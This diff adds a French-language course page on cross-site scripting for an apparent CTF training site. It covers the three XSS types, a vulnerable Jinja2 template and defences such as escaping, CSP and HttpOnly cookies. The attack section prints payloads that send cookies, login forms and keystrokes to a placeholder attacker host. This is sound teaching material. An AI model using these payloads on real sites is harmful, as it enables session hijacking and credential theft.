@@ -1,0 +1,353 @@
+{% extends "base.html" %}
+{% block title %}Cours : Cross-Site Scripting - CyberCampus CTF{% endblock %}
+
+{% block content %}
+<section class="page-wrapper course-page">
+  
+  <!-- Breadcrumb -->
+  <div class="breadcrumb">
+    <a href="{{ url_for('learn') }}">📚 Bibliothèque</a>
+    <span class="separator">/</span>
+    <span class="current">Cross-Site Scripting</span>
+  </div>
+
+  <!-- En-tête du cours -->
+  <div class="course-header">
+    <div class="course-header-icon">🔗</div>
+    <div class="course-header-content">
+      <h1>Cross-Site Scripting (XSS)</h1>
+      <p class="course-subtitle">Maîtriser la sécurité côté client et l'échappement HTML</p>
+      <div class="course-badges">
+        <span class="badge-high">Élevé</span>
+        <span class="badge-time">📖 12 min</span>
+        <span class="badge-level">⚡ Débutant</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Contenu du cours -->
+  <div class="course-content">
+
+    <!-- Section 1 -->
+    <div class="course-section">
+      <h2>🔍 Qu'est-ce que le Cross-Site Scripting ?</h2>
+      <p>
+        Le Cross-Site Scripting (XSS) est une vulnérabilité de sécurité qui permet à un attaquant d'<strong>injecter 
+        du code JavaScript malveillant</strong> dans une page web consultée par d'autres utilisateurs. Ce code s'exécute 
+        alors dans le navigateur des victimes avec les mêmes privilèges que le site légitime.
+      </p>
+      <p>
+        Contrairement aux injections SQL qui ciblent le serveur, les attaques XSS exploitent la confiance que les 
+        utilisateurs accordent au site web. Le navigateur ne peut pas distinguer le code légitime du code malveillant.
+      </p>
+      
+      <div class="info-box">
+        <div class="info-icon">💡</div>
+        <div class="info-content">
+          <strong>Impact des attaques XSS :</strong>
+          <p>Vol de cookies de session, redirection vers des sites malveillants, défacement de pages, 
+          keylogging, phishing, et même propagation de malware.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 2 -->
+    <div class="course-section">
+      <h2>📋 Les trois types de XSS</h2>
+      
+      <div class="xss-types-detailed">
+        <div class="xss-type-box reflected">
+          <div class="type-header">
+            <span class="type-icon">🔄</span>
+            <h3>XSS Réfléchi (Reflected XSS)</h3>
+          </div>
+          <p>
+            Le code malveillant est <strong>immédiatement renvoyé</strong> par le serveur dans sa réponse. 
+            L'attaque est généralement délivrée via un lien piégé.
+          </p>
+          <div class="example-box">
+            <strong>Exemple :</strong>
+            <code>https://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+            <p>Si le site affiche directement le paramètre <code>q</code> sans l'échapper, le script s'exécute.</p>
+          </div>
+        </div>
+
+        <div class="xss-type-box stored">
+          <div class="type-header">
+            <span class="type-icon">💾</span>
+            <h3>XSS Stocké (Stored XSS)</h3>
+          </div>
+          <p>
+            Le code malveillant est <strong>enregistré dans la base de données</strong> (commentaire, profil, message) 
+            et exécuté à chaque fois que la page est affichée. C'est le type le plus dangereux.
+          </p>
+          <div class="example-box">
+            <strong>Exemple :</strong>
+            <p>Un attaquant poste un commentaire contenant <code>&lt;script&gt;...&lt;/script&gt;</code>. 
+            Chaque visiteur qui lit ce commentaire exécute le code malveillant.</p>
+          </div>
+        </div>
+
+        <div class="xss-type-box dom">
+          <div class="type-header">
+            <span class="type-icon">🎭</span>
+            <h3>XSS basé sur le DOM</h3>
+          </div>
+          <p>
+            La vulnérabilité se trouve <strong>côté client</strong>, dans le code JavaScript de la page. 
+            Le serveur n'est pas impliqué dans l'attaque.
+          </p>
+          <div class="example-box">
+            <strong>Exemple :</strong>
+            <code>document.write("Hello " + location.hash.substring(1));</code>
+            <p>Si l'URL contient <code>#&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, le script s'exécute.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 3 -->
+    <div class="course-section">
+      <h2>⚙️ Comment fonctionne une attaque XSS ?</h2>
+      <p>Prenons l'exemple d'un livre d'or vulnérable :</p>
+      
+      <div class="code-block vulnerable">
+        <div class="code-header">
+          <span class="code-status">❌ Code vulnérable</span>
+          <span class="code-lang">HTML / Jinja2</span>
+        </div>
+        <pre><code>&lt;div class="comments"&gt;
+  {% raw %}{% for comment in comments %}{% endraw %}
+    &lt;div class="comment"&gt;
+      &lt;strong&gt;{% raw %}{{ comment.author }}{% endraw %}&lt;/strong&gt;
+      &lt;p&gt;{% raw %}{{ comment.text|safe }}{% endraw %}&lt;/p&gt;  &lt;!-- DANGER : |safe désactive l'échappement --&gt;
+    &lt;/div&gt;
+  {% raw %}{% endfor %}{% endraw %}
+&lt;/div&gt;</code></pre>
+      </div>
+
+      <h3>Scénario d'attaque :</h3>
+      <p>Un attaquant soumet le commentaire suivant :</p>
+      
+      <div class="attack-showcase">
+        <div class="attack-input">
+          <label>Commentaire :</label>
+          <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code>
+        </div>
+      </div>
+
+      <p>Lorsque la page est affichée, le navigateur interprète ce texte comme du code JavaScript et l'exécute !</p>
+
+      <h3>Attaques plus sophistiquées :</h3>
+      
+      <div class="attack-types">
+        <div class="attack-type-card">
+          <h4>🍪 Vol de cookies</h4>
+          <div class="code-snippet">
+            <code>&lt;script&gt;
+  fetch('http://attacker.com?cookie=' + document.cookie)
+&lt;/script&gt;</code>
+          </div>
+          <p>L'attaquant récupère le cookie de session et peut usurper l'identité de la victime.</p>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>🎣 Phishing</h4>
+          <div class="code-snippet">
+            <code>&lt;script&gt;
+  document.body.innerHTML = '&lt;form action="http://attacker.com"&gt;...'
+&lt;/script&gt;</code>
+          </div>
+          <p>Remplace la page par un faux formulaire de connexion pour voler les identifiants.</p>
+        </div>
+
+        <div class="attack-type-card">
+          <h4>⌨️ Keylogging</h4>
+          <div class="code-snippet">
+            <code>&lt;script&gt;
+  document.addEventListener('keypress', e => {
+    fetch('http://attacker.com?key=' + e.key)
+  })
+&lt;/script&gt;</code>
+          </div>
+          <p>Enregistre toutes les frappes clavier de l'utilisateur.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 4 -->
+    <div class="course-section">
+      <h2>🛡️ Comment se protéger ?</h2>
+      <p>La protection contre XSS repose sur plusieurs couches de défense :</p>
+
+      <div class="protection-method">
+        <div class="method-number">1</div>
+        <div class="method-content">
+          <h3>Échappement HTML systématique</h3>
+          <p>Convertissez tous les caractères spéciaux HTML en entités avant l'affichage :</p>
+          
+          <div class="code-block safe">
+            <div class="code-header">
+              <span class="code-status">✅ Code sécurisé</span>
+              <span class="code-lang">HTML / Jinja2</span>
+            </div>
+            <pre><code>&lt;div class="comment"&gt;
+  &lt;strong&gt;{% raw %}{{ comment.author }}{% endraw %}&lt;/strong&gt;
+  &lt;p&gt;{% raw %}{{ comment.text }}{% endraw %}&lt;/p&gt;  &lt;!-- Échappement automatique par défaut --&gt;
+&lt;/div&gt;</code></pre>
+          </div>
+
+          <div class="transformation-box">
+            <div class="transform-before">
+              <strong>Avant échappement :</strong>
+              <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+            </div>
+            <div class="transform-arrow">→</div>
+            <div class="transform-after">
+              <strong>Après échappement :</strong>
+              <code>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</code>
+            </div>
+          </div>
+
+          <p>Le navigateur affiche le texte tel quel au lieu de l'exécuter comme du code.</p>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">2</div>
+        <div class="method-content">
+          <h3>Content Security Policy (CSP)</h3>
+          <p>Définissez une politique de sécurité stricte via un header HTTP :</p>
+          
+          <div class="code-block safe">
+            <div class="code-header">
+              <span class="code-status">✅ Configuration sécurisée</span>
+              <span class="code-lang">HTTP Header</span>
+            </div>
+            <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';</code></pre>
+          </div>
+
+          <p>Cette politique :</p>
+          <ul>
+            <li>N'autorise que les scripts du même domaine (<code>'self'</code>)</li>
+            <li>Bloque les scripts inline (<code>&lt;script&gt;...&lt;/script&gt;</code>)</li>
+            <li>Interdit les plugins dangereux (Flash, etc.)</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">3</div>
+        <div class="method-content">
+          <h3>Cookies HTTPOnly et Secure</h3>
+          <p>Protégez les cookies de session contre le vol via XSS :</p>
+          
+          <div class="code-block safe">
+            <div class="code-header">
+              <span class="code-status">✅ Code sécurisé</span>
+              <span class="code-lang">Python / Flask</span>
+            </div>
+            <pre><code>response.set_cookie(
+    'session_id',
+    value=session_token,
+    httponly=True,  # Interdit l'accès JavaScript au cookie
+    secure=True,    # Uniquement transmis en HTTPS
+    samesite='Lax'  # Protection CSRF
+)</code></pre>
+          </div>
+
+          <div class="success-box">
+            <strong>Résultat :</strong> Même si un attaquant injecte du code XSS, il ne pourra pas 
+            lire le cookie avec <code>document.cookie</code>.
+          </div>
+        </div>
+      </div>
+
+      <div class="protection-method">
+        <div class="method-number">4</div>
+        <div class="method-content">
+          <h3>Validation et filtrage des entrées</h3>
+          <p>Vérifiez toujours les données côté serveur :</p>
+          <ul>
+            <li>Définissez une liste blanche de balises HTML autorisées si nécessaire</li>
+            <li>Utilisez des bibliothèques de sanitization (Bleach, DOMPurify)</li>
+            <li>Validez les formats attendus (email, URL, etc.)</li>
+            <li>Limitez la longueur des champs</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section 5 -->
+    <div class="course-section">
+      <h2>📝 Résumé des bonnes pratiques</h2>
+      <div class="checklist">
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span>Échappez TOUJOURS le contenu utilisateur avant affichage</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span>N'utilisez jamais <code>|safe</code>, <code>innerHTML</code> ou <code>eval()</code> avec des données utilisateur</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span>Implémentez une Content Security Policy (CSP)</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span>Marquez les cookies sensibles comme HTTPOnly et Secure</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span>Validez et filtrez les entrées côté serveur</span>
+        </div>
+        <div class="checklist-item">
+          <span class="check">✅</span>
+          <span>Utilisez des frameworks modernes qui échappent par défaut</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- CTA Challenge -->
+    <div class="challenge-cta">
+      <div class="cta-content">
+        <h2>🎯 Prêt à pratiquer ?</h2>
+        <p>
+          Maintenant que vous maîtrisez les concepts XSS, mettez vos connaissances en pratique ! 
+          Notre challenge vous propose d'exploiter une vulnérabilité XSS réfléchi dans un livre d'or.
+        </p>
+        <div class="cta-info">
+          <div class="cta-detail">
+            <span class="cta-icon">⭐</span>
+            <span><strong>120 points</strong></span>
+          </div>
+          <div class="cta-detail">
+            <span class="cta-icon">🎓</span>
+            <span>Niveau débutant</span>
+          </div>
+          <div class="cta-detail">
+            <span class="cta-icon">⏱️</span>
+            <span>10-20 minutes</span>
+          </div>
+        </div>
+        <a href="{{ url_for('challenge_view', challenge_id=2) }}" class="btn challenge-btn-large">
+          Accéder au challenge XSS Reflected
+        </a>
+      </div>
+    </div>
+
+    <!-- Navigation -->
+    <div class="course-navigation">
+      <a href="{{ url_for('learn_sqli') }}" class="nav-btn back">
+        ← Cours précédent : SQLi
+      </a>
+      <a href="{{ url_for('learn') }}" class="nav-btn next">
+        Retour à la bibliothèque →
+      </a>
+    </div>
+
+  </div>
+
+</section>
+{% endblock %}
